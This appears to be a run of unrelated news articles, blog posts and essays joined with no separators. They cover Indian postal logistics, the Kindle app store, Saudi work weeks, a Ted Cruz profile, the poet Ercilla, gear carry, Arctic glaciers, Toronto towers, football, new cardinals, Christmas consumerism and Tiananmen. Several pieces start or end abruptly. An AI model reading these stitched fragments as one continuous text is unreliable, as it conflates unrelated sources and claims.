NextEra is one of the leading producers of wind and solar power in the world. So, it's worth noting when NextEra's CEO says, "I want to be the leader in energy storage in the country."
Winds of change are blowing hard and fast at India Post, one of the world's most complicated postal networks. The government run establishment, which will shut down 160 year old telegram services next month, will enter a new and rather exciting market– the booming e-commerce business.
The postal department has entered into strategic partnership with India's national carrier Air India to transport goods between 15 domestic airports to provide airport to airport, city to city and door to door services. [Source]
The partnership is geared to tap into the growing e-commerce business for which logistics is still a pain point. The fledgeling $10 billion e-commerce market has seen some heavy investment flowing in over the past 3-4 years.
The department of posts, has plans to set up 20 mechanized warehouses and booking centers to cater to growing demand from e-commerce companies.
Also see: DTDC Launches Specialised Logistics Services for E-Commerce
India Posts Logistics Service is a Big Deal
This is totally a big deal for e-commerce in India. If India Post delivers on its promise. If, and a big if, at that.
India Post will charge 6% of the value of a product to deliver an item. As it stands now: there won't be any extra charges to handle cash or return.
Currently, logistics companies usually charge between Rs 65- Rs 75 for outstation delivery and an additional Rs 35- Rs 45 for cash on delivery. Returns could cost another Rs 40- Rs 55. In comparison with private players, India Post will be undoubtedly cheaper than it will not charge for cash handling.
The service will go a long way in solving the logistics problem. The department of posts has more than 150,000 post offices, a majority of which is in rural areas. If this services takes off, last mile delivery to tier 2 & tier 3 cities, a holy grail Indian e commerce companies have been chasing for long, will become simpler.
The department also has lots of experience in dealing with cash on delivery.
Now comes the big IF part: All the courier companies would be out of business if India Post was so good at what it does. The reliability of India Post is a big question mark. For instance, thousands of letters remain undelivered every year. Express services take much longer than expected in many cases. E-commerce companies which are already taking a beating on poor customer service, might want to tread with caution.

Nine months after Amazon announced the launch of an app store for its Kindle e-reader, the first paid app, Scrabble, has made its way into the store.
The $4.99 app [Amazon link], which was developed by Electronic Arts, joins two free word games already in the store. Amazon will take a 30% cut of revenue generated from sales of the app.
Although it's a well-designed app, perfect for the Kindle's book-loving userbase, it's somewhat disheartening that only three apps have been released thus far. When the app store was first announced, Amazon VP Ian Freed said that the company had "heard from lots of developers over the past two years who [were] excited to build on top of Kindle." Somehow, we weren't expecting "lots" to equate to "one." (The first two apps were both developed by Amazon's internal team.)
It's possible that the promise of an app store, announced just ahead of the iPad unveiling, was merely an attempt to make the media think twice before labeling Apple's tablet device the "Kindle killer." Time will tell whether Amazon does, in fact, plan to go after developers and build an app store to rival those of Apple, Android and BlackBerry. Given the Kindle's lack of a touchscreen, ability to play animations, and myriad other capabilities that allow for highly interactive apps, it doesn't seem likely.
Of course, if Scrabble turns out to be a commercial success, that may change things.

SAUDI ARABIA'S Shura Council, an unelected proto-parliament, agreed on April 22nd to consider a proposal to switch the country's official weekend from Thursday and Friday to Friday and Saturday. The idea was first mooted in 2007, but was blocked by the council. Some members of the conservative Islamic clergy apparently opposed it on the grounds that it would mean observing the same weekend as the Jews—whose Sabbath lasts from Friday evening to Saturday evening—and might even be a step towards embracing the Saturday-Sunday weekend observed by Christians. So why is Saudi Arabia once again thinking of moving its weekend?
Although the seven-day week dates back at least as far 2350BC—when it was first formalised by Sargon I, king of the Mesopotamian empire of Akkad—the two-day weekend is a more recent development. For much of history, the norm, first established by the Bible, was to work for six days and rest only on the seventh. For Jews and early Christians, that day was Saturday. When the Roman Empire embraced Christianity, Constantine the Great switched it to Sunday—some say in order to attract converts from the eastern religions who worshipped the Sun. A few hundred years later, the Koran fixed Friday as Islam's holy day, on which Muslims must gather at midday for communal prayer—though there is no particular requirement to rest. But the idea of a two-day weekend is a product of modern day labour laws. (Indeed, Saudi Arabia is only now mulling legislation that would give private-sector employees the same rights to two days off that public-sector workers now enjoy.) While much of the Middle East established Friday to Saturday weekends, a clutch of Gulf and north African countries took off Thursday and Friday instead. Yet as the economic cost of sharing only three working days (Monday to Wednesday) with international trading partners became increasingly apparent, most switched to Friday and Saturday. The most recent country to do so was Oman, on May 1st.

Saudi Arabia boasts the region's biggest economy and largest stockmarket. As it tries to promote itself as a regional financial hub, it is paying an especially high price for keeping its calendar out of sync with its neighbours. Opinion polls suggest most Saudis approve of ditching the current weekend. Business has been pressing for change for years. And some private companies are taking unilateral action: the Savola group, a Saudi company that is one of the Middle East's biggest conglomerates, is considering moving its weekend from the middle of this year to facilitate its operations with the rest of the region.
The issue has become a national topic of debate. Although there is no religious proscription against working on a Thursday, traditionalists balk at change. The switch may still not be approved; the Saudi gerontocracy has been notoriously slow to reform. But as the cost to Saudi Arabia's economy becomes ever clearer in difficult economic times, the pressure to fall in line will continue to mount. As one of the few countries still resisting the change, commercial interests will probably trump conservatism eventually.

In his Thursday front-page New York Times profile of "gruff" Sen. Ted Cruz on the trail in Iowa political reporter Matt Flegenheimer took pains to portray the Texas senator and Republican presidential candidate as an unlikeable, socially awkward “bomb-thrower” ideologue (“appraised as grating and pompous as a matter of bipartisan consensus”) in “Cruz the Gruff Taking a Turn At Being Nice.” The online headline was no less hostile: "After Making Enemies, Ted Cruz Tries to Make Friends.” Never mind that his poll numbers show he's gaining a lot of supporters in Iowa.
Democrats Hillary Clinton and Bernie Sanders suffer heavy deficits in the charisma department, but don't get personally attacked for it on the front page the Times. Flegenheimer's opinionated profile piece, which characterized Cruz's demeanor as growling and his rhetoric as “apocalyptic,” was more suitable for a guest essay in the magazine than an ostensibly balanced front-page news story from one of the paper's stable of political reporters.
Senator Ted Cruz had been at it for several minutes, offering handshakes and uneasy smiles, when he encountered an apparent holdout in the crowd. Mr. Cruz squatted. He squinted. He had heard something about a toy collection. And so, about three feet above the floor of an American Legion hall here, the senator began his questioning. “You have lots of toys?” he asked 3-year-old Isaac Josselyn. Nothing. “What's your favorite toy?” More silence. “Do you have a dinosaur?'” “Do you have a fire truck?” “You have a toy monkey?”
Isaac stared blankly. “A toy monkey!” Mr. Cruz shouted, revving for a punch line no one understood. “You know what that means? You get to be the monkey in the house!”
The Times trotted out its favorite hostile description of aggressive conservative reformers. Evidently there's a new “bomb-thrower” on the Hill to take over from Newt Gingrich.
"Ercilla" redirects here. For other uses, see Ercilla (disambiguation)
Alonso de Ercilla y Zúñiga ( Spanish pronunciation: [aˈlonso ðe eɾˈθiʝa]; August 7, 1533 – November 29, 1594) was a Spanish nobleman, soldier and epic poet, born in Madrid. While in Chile (1556–63) he fought against the Araucanians (Mapuche), and there he began the epic poem La Araucana, considered one of the greatest Spanish historical poems.[citation needed] This heroic work in 37 cantos is divided into three parts, published in 1569, 1578, and 1589. It tells of the courageous insurrection of the Araucanians and also relates the history of Chile and of contemporary Spain.
Biography [ edit ]
Ercilla was born into a Basque noble family. His father was Fortuño García de Ercilla, and his mother Doña Leonor de Zúñiga, both from Bermeo (Biscay). In 1548, after his father's death, his mother became lady-in-waiting to the Infanta María and made young Alonso a page to the heir-apparent, Prince Philip (afterwards King Philip II). Ercilla received a very thorough education, for, besides having the most learned teachers, he enjoyed the advantages of very extensive travelling and of living at court where he came in contact with high personages. When he was only fifteen he accompanied Philip through Italy and Germany; and their travels lasted three years. Later, Ercilla accompanied his mother to Bohemia where he left her and then visited Austria, Hungary, and other countries. Returning to Spain, he soon started out again with Philip. In this capacity Ercilla (sometimes spelled Arcilla) visited Italy, Germany and the Netherlands, and was present in 1554 at the marriage of his master to Queen Mary I of England.[1]
In London, he made the acquaintance of Jerónimo de Alderete (1555), whose stories of his thrilling adventures in the New World so fired Ercilla's imagination that he determined to accompany Alderete to the New World. He therefore obtained leave from Philip, and they set sail for America, 15 October 1555. Soon after their arrival, however, Alderete died (near Panamá, April 1556).
In 1556 Ercilla continued on his way to Peru and accompanied García Hurtado de Mendoza, recently named Governor and Commander-in-chief of Chile, where the Araucanians had revolted. He distinguished himself in the ensuing campaign. Apparently he remained in Chile seventeen months, between 1557 and 1559. He participated in the battles of Lagunillas, Quiapo and Millarapue, and witnessed the death of Caupolicán, protagonist of La Araucana. This is an epic poem of military exaltation in 37 "cantos" or verses, where the narrator relays the most significant facts of the Arauco War against the Araucanos (mapuches) and which he began to write during the campaign.
In March 1558, García Hurtado de Mendoza founded the city of San Mateo de Osorno and while their neighbours were preoccupied with the celebrations in the new city, García left by a secret entrance, disguised by a helmet with closed visor, accompanied by Ercilla and Pedro of Eyrie. They were confronted by Juan de Pineda, an old enemy of Alonso de Ercilla, and there was a fight. García was warned of the situation.
Alonso de Ercilla ran to a church and looked for asylum. The governor imprisoned both duelists and condemned them to be executed on the following day. However, many people considered the sentence unjust and tried to persuade García to reprieve them. The preparations for the execution continued and all hope of saving them was lost. Then two women, one Spanish and another Native American, approached the house of García, entering by the window, and managed to convince the governor to spare the lives of both. Ercilla was imprisoned for three months and soon afterwards was exiled to Peru.
Later life [ edit ]
After Ercilla's return to Spain in 1562, he made several diplomatic journeys to Austria, where his mother was a maid of honor at the imperial court, and also visited Italy, France, Germany and Bohemia. In 1570, he married Doña María de Bazán, a woman of illustrious family and of intellectual attainments and, after other diplomatic missions, settled permanently in Spain in 1577. In 1571 he was made a knight of the Order of Santiago, and in 1578 he was employed by Philip II on a mission to Zaragoza. He complained of living in poverty but left a modest fortune, and was obviously disappointed at not being offered the post of secretary of state.[1] Ercilla's later years were saddened by the loss of his only son, and his own death occurred in Madrid in 1594.
Works [ edit ]
Retratos de Españoles Ilustres ("Portraits of Illustrious Spaniards"), 1791. Alonso de Ercilla in the("Portraits of Illustrious Spaniards"), 1791.
Ercilla's great work is La Araucana, an epic poem of thirty-seven cantos, describing the difficulties encountered by the Spaniards during the insurrection in Arauco, and the heroic deeds of the natives as well as his companions. The epic partakes of the character of history, and the author adheres with such strict fidelity to the truth, that subsequent historians characterize his work as thoroughly trustworthy. In it the difficult art of story-telling is carried to perfection. Places are admirably described, dates are given with accuracy, and the customs of the native faithfully set forth, giving to the narrative animation and colouring.
The poem was published in three parts, of which the first, composed in Chile and first appearing in 1569, is a versified narrative adhering strictly to historic fact; the second, published in 1578, is encumbered with visions and other romantic machinery; and the third, which appeared in 1589-1590, contains, in addition to the subject proper, a variety of episodes mostly irrelevant.[1] Nevertheless, many scholars[who?] consider it the most successful Renaissance epic in the Classical mode written in Spanish. The best editions are those published by the Spanish Academy in 1776 and 1828.
In literature [ edit ]
In his novel In Search of the Castaways (1867), Jules Verne wrote,[2] "Araucania is populated by the Mapuche, the native Chilean race extolled in verse by the poet Ercilla".
Legacy [ edit ]
There is a municipality in the Araucania Region of Chile named after Ercilla.

Your website should lead visitors to act. A conversion happens anytime a visitor takes an action that you want them to take. For your website, this conversion is most likely a sale, a sign-up or a call. You can find your conversion rate by dividing the total number of actions taken by the total number of unique visitors and multiply by 100. For instance, if your website had 5,000 unique visitors and 100 sales, your conversion rate would be 2%. Conversion rate optimization (CRO) is the process of increasing your conversion rate. Here are a few ways conversion rate can affect your business.
Conversion Rate Optimization Grows Your Business
Conversion rate optimization is essentially free because it is optimizing on people who are already on your site. Referring to our example above, optimization is increasing our 100 sales from our 5,000 visitors. Whether it is making the purchase process easier or adding reviews to a product or service, these tweaks can increase your conversion rate. Raising your conversion rate will maximize your profits. Because you aren't paying more for each new conversion, each new conversion goes straight to your bottom line. Now, getting more people to your site is a different story.
Your Conversion Funnel Is Very Important
The typical customer funnel starts with awareness and is followed by interest, desire, and finally action. But, how many of your visitors are taking action? Some key metrics that will help you understand your conversion funnel are a bounce rate, an exit rate,an average number of page views, and average time on site. These can all be found via Google Analytics.
If your bounce rate is high, visitors are not finding what they are looking for and leave without going any further. If this is the case, you need to improve your homepage or landing page and guide your visitors to where you want them to go. Next, the exit rate will show you where your traffic is leaving your site. You can learn a lot about your customers by looking at your browse abandonment, when customers leave after viewing a category or product, and cart abandonment, when customers leave after adding something to their cart or at checkout. The average time on site and average page views will show you how long visitors stay on your site and how many pages they viewed.
These metrics are fundamental and will give you a good idea of what to improve. Your goal should be to make your conversion funnel as smooth as possible.
There Is Always Room For Improvement
Once you have started to see an increase in your conversion rate this is not the time to stop improving your website. There are many tests that you can try as you seek to find the best solution. Test your call-to-action button wording, size, and color. Look at your competitor's websites and take notes of what you like and dislike. Change your on-site promotional offers. Upload new and high resolution pictures. Test your website through website review sites and see what others think. As you continue to make changes, be sure to watch how each change affects your conversion rate.
Running your website is only part of your company's presence online. The information you can gain from tools like Google Analytics can have far reaching effects on your entire business. For help with understanding your conversion rate, contact our CRO team at Tractus. We'll help you optimize your conversion rate and grow your business.

This is a post I was planning to write for a long time now, but somehow never came around to. In 2012 I wrote about my keyring as the main part of my EDC1). Since then a lot of my equipment changed, so here's what I carry every day: The goal with my EDC is to be able to carry the same things really every day. That means Winter or Summer, regardless of clothing or bags carried. So everything has to fit on my body when I only wear jeans and T-Shirt on a hot summer day. And I have to actually regularly use the things I carry, otherwise why carry them? The things you see above are the result of 4 years of optimizing Below is a detailed description of all the items.
Philips Bluetooth Headphones
To me, headphones are a must to survive public transport. I had to switch to Bluetooth phones from my previous Sony headphones, because the headphone connector of my phone broke (apparently a common problem with that model). I tried about seven different models and found that many of them did not work properly with my phone (problems adjusting the volume). Of the ones that did work, the Philips ones were most comfortable for my head and still in an acceptable price range. The battery lasts about a week for me. Amazon.de Amazon.com place: on my head or around my neck
Butterfly Wallet
I'm still using the same wallet I wrote about in 2013 - the Butterfly Wallet. I haven't found any better solution that is as compact at this one. Three years later it's starting to show signs of wear. Small holes are appearing on the corners and seams begin to dissolve, but it still works. The maker's website seems to be gone but it is still available via Amazon. Amazon.com place: right front pocket
Freekey Keyring
Nothing new here. It just works. From time to time I consider using a solution like the Keysmart or Orbitkey but I'm not sure if that would actually be an improvement. Amazon.de Amazon.com place: right front pocket
Corsair Voyager Vega
This USB3 stick replaced my Kingston DataTraveler SE9. It's smaller, faster and has double the capacity. I am still using the Ultimate USB Stick Setup on it. Amazon.de Amazon.com place: right front pocket
Victorinox Manager
I found those little Victorinox swiss army knifes to be the best compromise of utility and weight. The Manager replaced a dedicated bottle opener and the Swiss+Tech Utili-key on my keyring. Its bottle opener admittedly needs a little more skill to use than other solutions, but I don't want to carry the same utility twice. I previously used the Victorinox Rambler wich is a good and tiny bit smaller choice. But the Manager adds scissors and a tiny pen at expense of the toothpick I never used anyway. To me the scissors were worth to have. All in all the Manager covers the following functions: Bottle Opener
Knife (theoretically it should be short enough for TSA - never tried though)
Philips Screwdriver
Flathead Screwdriver
Nailfile
Scissors
Tweezers
Pen Amazon.de Amazon.com place: right front pocket
NFC Ring
I bought this one during the original Kickstarter. I don't really use the NFC functionality in day to day use, but it's a cute gimmick. Since Kaddi and I both own and wear one, this is more like an unofficial wedding band to me. nfcring.com place: left hand ring finger
LG Watch R
I'm still quite happy with this Android Wear Smartwatch. Read my blog post from last year. Amazon.de Amazon.com place: left wrist
Sony Z3 Compact
The Sony Z3 Compact replaced my Nexus 4 and mostly kept the form factor. Despite the broken headphone connector I'm still happy with it. Marshmallow arrived about two weeks ago – that could have been earlier, but at least Sony is still updating their older models. The battery life was phenomenal when I first got it. After about 1.5 years now, the battery is not as good as it was before, but still lasts through a common day easily. Amazon.de Amazon.com The Cruzerlite Bugdroid skin doesn't add much size and is the only one I could find that covers the charging flap. Which I wanted because I use a magnetic charger instead. Amazon.de Amazon.com place: left front pocket
Skinth Nano Shield
This was added to my EDC to slim down my keychain. I carry the flashlight and the pillbox in it. It's really small and weighs next to nothing on my belt. I can easily operate it with one hand which is really handy to access the flashlight while you're doing something. skinthsolutions.com place: belt
Fenix E05 2014 Edition
The 2014 edition of this classic AAA flashlight improved the Lumen output with a new type of LED. In my research it came out as the best compromise between brightness, size and battery life. Many people think carrying a flashlight is obsolete with the availability of flashlight apps on phones. However I find a dedicated flashlight much easier to use. I can access and turn on my flashlight single handed and I can even hold it with my mouth when I need both hands. Try that with a phone. Amazon.de Amazon.com place: belt
Grenhaven Pill Fob XS
A genric small pill fob. I bought this before using the Skinth Nano, so I tried to find the smallest version possible to not bloat my keychain too much. I use it to carry a single pain killer pill. Unfortunately it is so small that I can not put a pill with it's usual plastic wrapper in it. Instead I have to unpack the pill and wrap it in tinfoil. Which might look really suspicious should police ever check me . I will most likely replace the fob with a slightly larger version some day. Amazon.de place: belt

James and his crew were looking for some good shots for an upcoming documentary, but no one was prepared for what would soon unfold in front of their eyes.
The incident took place in Greenland, where James and his mates were gathering images from cameras that had been deployed around the Arctic Circle over the years.
Photographer James Balog and his team were examining a glacier when their cameras caught something out of the ordinary.
Even though American photographer James Balog specializes in nature photography, for a long time, he didn't believe in climate change.
In fact, for nearly 20 years, he taunted scientists about global warming.
"I didn't think that humans were capable of changing the basic physics and chemistry of this entire, huge planet. It didn't seem probable, it didn't seem possible," Balog says.
It wasn't until 2005 that Balog realized something was amiss while taking a close-up look at how climate changes affect nature.
During a National Geographic-commissioned photo expedition to the Arctic, he saw the enormous damage firsthand.
Exactly 10 years later, Balogs' film "Chasing Ice" premiered, and he decided to document the melting of glaciers with an army of cameras.
And it was in this context that Balog caught one of the most spectacular scenes ever filmed.

The historic event has been recorded in the Guinness Book of Records and clearly shows how serious the situation is for Earth's climate.
As far as anyone knows, it was an unprecedented geological disaster. Unfortunately, though, it's unlikely to be the last one of its kind.
Watch the powerful video here:
In November 2016, the Arctic was 20 degrees warmer than average, which is much warmer than even research models had predicted.
Unfortunately, we're faced with disaster if we don't zero our global greenhouse emissions by 2070. But on the positive side, we still have a chance to make that happen.
Hopefully, this video will help convince more people of how serious the situation is, so that together we can help to reverse the trend!
No one can do everything, but everyone can do something. Please share!

David Mirvish and world-renowned architect Frank Gehry have dramatically altered plans for their King Street West condo project, saving the Princess of Wales Theatre and heritage buildings on the block.
After more than 40 iterations, the latest plans include just two condo buildings, down from three, and are being welcomed by the city of Toronto planners who had objected to the density of the original design and its plan to demolish the theatre, and warehouse space they deemed to have historic value.
With the concessions to the city, Mr. Mirvish is hoping to receive approval to smash through height restrictions. One of the towers is designed to stretch 92 storeys into the sky, six more than first proposed. The tower would be 304.3 metres high, making it about six metres taller than First Canadian Place, the country's tallest building outside of structures such as the CN Tower.

The new plans were cobbled together in about a month, and are not fully complete. Neither is the approval process. But Mr. Mirvish is hoping the latest version will end the long process to win approval for his controversial and ambitious project.
He and Mr. Gehry said the clock is ticking. Mr. Gehry is 85 and Mr. Mirvish will turn 70 in August. Even after final approvals, the project will take many years to build. "We're moving as fast as we can now because Frank and I are both aging," Mr. Mirvish said on Tuesday.
The project is controversial largely because of its height and density, and the demands it would place on local infrastructure. Planners took issue with the original design on details ranging from the amount of parking (the city wanted more) to the shadows that might be cast on downtown sidewalks.
With no resolution in sight, Adam Vaughan, then a city councillor, struck a 14-member working group to seek a compromise. About a month ago, Mr. Mirvish held a third meeting with the group, and decided that he would do two towers and preserve the theatre and warehouse space.
The latest iteration of the plans have received a nod from that group and planners, but needs the green light from Toronto-East York community council next month and Toronto city council in July.
Toronto's head planner, Jennifer Keesmaat, said it is wrong to call the new plan a compromise. "It's a new project that's better than the project that existed before," she said.
Ms. Keesmaat said planning staff are "absolutely thrilled" with the result. "Frank Gehry has been able to use his creativity to come up with a proposal that, quite frankly, exceeded my expectations about how you could have a tremendous amount of development on this site and at the same time be very true to its historical context."

While the block would get a taller tower, Ms. Keesmaat said its slender profile would reduce shadows.
Mr. Gehry conceived the original design as a candelabra with three candlesticks. The two-tower design will be "sculpted almost like waterfalls flowing into a pool on one side, and on another aspect of it having a clay appearance," Mr. Mirvish said.
"Frank is building me a jewel box," Mr. Mirvish said. That "box" will be placed on top of the warehouse on the west end of the block, and will have 9,200 square feet of space to house art exhibitions. That's a small fraction of the space in the original design to house Mr. Mirvish's personal art collection. OCAD University will have a facility on the site as planned.
Mr. Mirvish, the theatre impresario, art collector and son of "Honest Ed" Mirvish, has talked about his project as sculptures for people to live in. He said on Tuesday that he has not yet figured out the financial details for the latest iteration.
"We're still doing the math as we go, because this is four weeks and it usually takes six months to design the details," he said. "But I'm sure we'll make it work. Frank always has an eye to not just making a design, but making something that will actually get realized and built and be able to be paid for."
The two towers together will have about 2,000 units, down from more than 2,700. The second tower is planned at 82 storeys. Peter Kofman, president of Projectcore Inc., the developer and project manager, said the buildings have been designed in such a way that they could be rolled out in phases based on demand.

Mr. Vaughan, the area councillor until he resigned his seat to run in a federal by-election next month, predicts the project will transform the intersection of King and John streets into the cultural heart of the city with the gallery, OCAD University, theatres and TIFF Lightbox.
"It is a great opportunity and a great project," Mr. Vaughan said. "We have saved the theatre and the heritage buildings. We found a way to work together."

Linfield FC manager Warren Feeney was left speechless after the Belfast club celebrated a special European landmark with a 1-0 UEFA Europa League victory over AIK Solna at Mourneview Park.
In what was the club's 100th game in Europe, supersub Andy Waterworth was the last-gasp hero, racing clear to rifle home an 87th-minute winner, and secure only the club's 17th continental success."I'm a bit lost for words," said Feeney. "It was an historic night for the club and the players responded with a phenomenal performance and result.
"We were well aware it was the club's 100th game in Europe," noted Feeney. "I suppose that brought some pressure, but the players produced one of the best performances I have seen in my time in football. AIK are second in the Swedish league, they had a lot of internationals in their team and also Celso Borges who has just returned from the World Cup with Costa Rica."
Blues striker Waterworth, who came on as a replacement for Peter Thompson 13 minutes before grabbing the winner, added: "It was an outstanding result and I was delighted to score on such an historic night for the club. Not many gave us a chance, but we were quietly confident we could surprise a few people. Everyone was talking about Linfield's 100th game in Europe, so maybe this win was meant to be."
The club's 100 games include 96 in UEFA competition; 63 in the European Champion Clubs' Cup and UEFA Champions League, 27 in the UEFA Cup and UEFA Europa League and six in the now defunct UEFA Cup Winners' Cup. Their remaining four games were played in the Inter-Cities Fairs Cup – the non-UEFA affiliated ancestor of the UEFA Cup and UEFA Europa League.
Linfield's first foray into Europe was 55 years ago, when a team coached by legendary Newcastle United FC striker Jackie Milburn suffered a 7-3 aggregate defeat to IFK Göteborg of Sweden in the 1959/60 European Cup. The Windsor Park outfit's record in Europe now reads: P100 W17 D29 L54.
"We were big underdogs, but I had a quiet feeling we could cause a shock," said Feeney of the AIK game. "The desire and quality the players showed was phenomenal and the longer it went on, the more confident I was that we could win. It's only half-time in the tie and the return leg in Sweden will be a different ball game. It'll be tough, but we'll go there in a positive frame of mind. We'll look forward to it."
ROME—Never one to shun surprises, Pope Francis today announced the creation of five new cardinals. The ceremony to induct the new Princes of the Church will take place on June 28, and the new cardinals will say Mass with him on the following day, the feast of Saints Peter and Paul.
The fact that the five cardinals come from “diverse parts from the world,” expresses the “Catholicity of the church, diffused throughout the earth,” Pope Francis said.
The five new cardinals are:
Bishop Gregorio Rosa Chávez, auxiliary bishop of San Salvador in El Salvador;
Archbishop Jean Zerbo, of Bamako, Mali;
Bishop Anders Arborelius, of Stockholm, Sweden;
Archbishop Juan José Omella of Barcelona, Spain;
Bishop Louis-Marie Ling Mangkhanekhoun Apostolic Administrator of Vientiane, Laos.
In keeping with his passion for the peripheries, four of the five men Francis named on Sunday represent countries that have never before had a cardinal: Mali, Sweden, El Salvador and Laos.
In what has become a trademark of this pontificate, Francis blindsided long-time Vatican watchers and even most of his closest collaborators alike when he announced the names of his new cardinals today. He did so at the end of his Sunday Regina Coeli prayer, which during the Easter season replaces the traditional Angelus.
“We entrust the new cardinals to the protection of St. Peter and Paul,” Francis said, “so that with the intercession of the prince of the apostles they are authentic servers of the ecclesial communion, and so that with that of the apostle of the peoples they are joyful announcers of the Gospel, and that with their witness and council they sustain me more intensely in my service as bishops of Rome, shepherd of the Universal Church.”
All of the new cardinals are under 80 and therefore eligible to vote for the next pope.
Of the five cardinal-elects, two were appointed to their dioceses by Francis: Omella, who has been in Barcelona since 2015, and Mangkhanekhoun, who took over in Vientiane in Feb. 2017. The rest were appointed by John Paul II.
On choosing Rosa Chávez from El Salvador, the pope bypassed the titular archbishop of the diocese, José Luis Escobar y Alas, once again making the point that when he gives red hats, he's more than willing to go beyond the traditional “cardinal sees,” something he's done in the previous three consistories he's celebrated.
This pick in particular says a lot about Francis, because Rosa Chávez was a close collaborator of slain Archbishop Oscar Romero, who was murdered in 1980 while he was saying Mass.
Talking to Vatican Radio in the days previous to the beatification of Romero, the archbishop said that the murdered archbishop is “the icon of [the kind of] pastor Francis wants, the icon of the Church Francis wants … a poor Church for the poor.”
When a pope creates new cardinals, he's not only choosing the person who might be his eventual successor. By matter of hierarchy, the “red hats,” as they're often called because of the color of their zucchetto, or skullcap, also serve as papal advisers.
Though it hardly means a move to Rome, those under 80 are quickly appointed to Vatican offices and councils, which often lead to at least annual pilgrimages to the eternal city.
The selection also says a lot about the path a pontiff wants the church to take.
In the “Francis era,” many of the new red hats hail from far-flung, often overlooked dioceses where Catholics are a distinct minority. This is a reflection of the pope's insistence that the church needs to look to the peripheries and bring them to the center.
In 2014, Francis created 19 new cardinals, 16 of them under the age of 80.
The list included Chibly Langlois, from Haiti's Les Cayes, meaning he overlooked Port au Prince, the capital and major diocese. Francis also overlooked more traditional Caribbean power-houses, such as Cuba, Puerto Rico and the Dominican Republic.
That same year, the pontiff also appointed Philippe Nakellentuba Ouédraogo, of Ouagadougou, Burkina Faso, and Jean-Pierre Kutwa, of Abidjan, Ivory Coast.
The first pope from the global south is also known for overlooking what are known as historic red hat sees, meaning dioceses that have had a cardinal for quite some time. In the United States, for instance, these would be cities such as Los Angeles or Philadelphia. In Italy, this means Turin and Venice.
Of the new batch of red hats, three of them come from the peripheries.
Mangkhanekhoun, of Laos, hails from a country under communist rule, and where Catholics represent a minority: The 46,000 faithful amounts to less than one percent of the total population. There are no dioceses in the country, only apostolic vicariates, and around the country there are 67 Catholic parishes, tended by 17 priests. According to the Catholic Almanac, there are 20 seminarians in the country and 93 religious sisters.
With Buddhism as the state religion, the bishops of two of the four apostolic vicariates have denounced that religious practice is controlled and sometimes difficult.
Including these five, Francis has created 60 new cardinals, 49 with voting rights, in a four-year pontificate.

The problem with Christmas is not the batteries. The problem isn't even really the stuff. The problem with Christmas is that no one many likes it anymore.
If you poll Americans this time of year, far more of them regard the approaching holidays with dread than anticipation. It has long since become too busy, too expensive, too centered around acquiring that which we do not need. In fact, it's the perfect crystallization of the American economy — the American consumer experience squeezed into a manic week, a week that people find themselves hoping will soon end so that on Jan. 2 they can return to the mere routine hecticity of their lives.
From that central truth, a few propositions follow:
Replacing regular stuff with green stuff isn't getting very close to the root of the problem. If for some reason you need to give someone a motorized spice rack, then a motorized spice rack with a more efficient motor is quite clearly better. But it's also quite clearly beside the point.
Stuff itself is a problem less because of its environmental toll (though that is quite high) than because it's increasingly meaningless. Think of your friends. Are many of them lacking in stuff? Or is the first question that forms in their minds when a new gift arrives from under the tree: “Where am I going to put this?”
But this pleasure gap allows for a concentrated opportunity to begin rethinking our economic life. If stuff isn't valuable anymore, what is? Time, clearly. A gift of time — a coupon for a back rub, or a trip to the museum, or a dinner prepared someday in the future — is a gift whose exchange rate is figured in a stronger currency (if you're an economics major, think euros vs. dollars). Or gifts can come embedded with time already spent: a jar of homemade jam, a stack of firewood in the back yard.
Gifts can also be reconfigured to remove some of the hyperindividualism that marks our consumer society. Ask yourself what you'd rather receive: another thing, or a homemade card saying that, say, a cow had been purchased in your name and was now providing milk for a Tanzanian family that hadn't had milk before. (Note: this line of reasoning is probably especially strong for those of us who are Christians, and recall that the occasion we're celebrating is the birth of a man who said to give all that we had to the poor.)
Since Christmas has long been in the business of baptizing consumption, it's a good place to start eroding consumption's allure. Newfound pleasures from a simpler holiday — some silence, some companionship — suddenly start to seem attractive. Maybe that attraction will remain with us yea even unto February.
The Gift of Nothing Check out 10 ideas for stuff-free gift alternatives.
That would be good, because our environmental problem, at root, isn't that the stuff we're buying uses too much energy or too much plastic, or that its paint has lead in it, or that it's been shipped too far. Our environmental problem is that we consume way too much because we've agreed to try and meet basic human needs — status, respect, affection — with material ends. And no time more so than at Christmas, when Santa rides in on a Norelco razor. It's a kind of joint conspiracy that few of us dare break out of, even though we all understand at some level that it's not working. What if you don't give your kids a “proper Christmas”?
But the second you do break out of it — the second your family becomes one of those that exchanges used books at Christmas, or decides to follow St. Francis' Yule tradition of wandering the park and throwing seed so that the birds too could celebrate, or makes it an annual custom to serve turkey dinner at the homeless shelter — then you start sharing in the deep human secret that consumer society is set up to obscure: the things that please us most are almost always counterintuitive. We need to be out in the cold air, we need to think about others, we need to serve.
There are, of course, some who will say that a course like the one I'm describing here will damage the economy — that anyone who proposes a different Yuletide is a “grinch.” (This, by the way, is a major literary faux pas. Close reading — even cursory reading, or even viewing the annual television special, will remind one that it was in fact the grinch himself who believed that Christmas came in a box. He turned out to be wrong, as the Whos of Whoville, those communists, made clear.) You could answer those people by saying, “Well, it won't all happen at once, and the economy will have time to adjust.” Or you could answer by saying, “Maybe you're right. And maybe the economy isn't therefore quite as rational and as obvious as we would like to believe, if in fact it depends on a corrupted celebration of Jesus' birth to stagger on for another year.”
The second answer appeals to me. We need a kiss to break our enchantment, and a kiss (a coupon for a kiss! Or a dozen!) is a perfectly fine gift to give for Christmas.

"It was exactly 20 years ago that I stood on the northwest corner of Tiananmen Square and watched 'People's China' open fire on the people," said Nicholas Kristof in The New York Times. Now, China is "frozen politically," mention of the Tiananmen anniversary is blocked on Twitter, and there is no sign of the people's "bold yearning for democracy." Many still want change but are biding their time; others have already received, courtesy of China's economic boom, the only thing they really wanted—"a better life."
"Count me unimpressed," said Claudia Rosett in The Wall Street Journal. China's rulers are hoping the world will look at their economic achievements and believe they've come into the 21st century. But "the real sign of modernity will come when China opens up its political system enough so that the country's leaders no longer fear June 4 but treat the Tiananmen uprising with the honor it deserves."
Don't hold your breath, said Christopher Beam in Slate. The Chinese government has carefully scrubbed any mention of the the 1989 protests and the ensuing massacre from textbooks and the media. The state has substituted its own version of events—in which no civilians died but several martyred soldiers were burned alive in their vehicles. "For the most part, the government avoids discussing the issue at all."

Ronnie Hillman is movin' on up at Mile High.
The Denver Broncos shifty running back has stood out during the first two preseason games, carrying 16 times for 120 yards, a whopping 7.5 average per carry.
